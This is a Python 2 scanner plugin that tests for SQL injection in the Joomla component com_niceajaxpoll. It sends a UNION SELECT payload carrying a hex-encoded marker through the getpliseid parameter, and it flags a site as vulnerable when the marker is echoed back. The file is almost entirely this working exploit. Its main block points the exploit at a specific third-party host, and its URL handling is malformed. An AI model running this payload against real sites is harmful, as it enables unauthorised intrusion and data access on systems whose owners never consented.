#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer https://www.sebug.net/vuldb/ssvid-90196
#__Author__ = 上善若水
#_PlugName_ = joomla_sql Plugin
#_FileName_ = joomla_sql.py
from ..miniCurl import Curl
from ..t  import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'index.php/?option=com_niceajaxpoll&getpliseid=-6725%20UNION%20ALL%20SELECT%2094,94,CONCAT(0x71626a7671,0x5759706d737349577448575a6f5553684e4d4b70506a4b436f785a78677557674267524475744468,0x71766b6271),94#'
        url = arg + payload
        code, head, res, errcode, _url = curl.curl2(url)
        if code == 200 and 'qbjvqWYpmssIWtHWZoUShNMKpPjKCoxZxguWgBgRDutDhqvkbq' in res:
            output(url,result,'hole')
                
        

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_79de760480462e3249956c4b569f4735.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_79de760480462e3249956c4b569f4735.py
#/root/github/poccreate/codesrc/exp-2262.py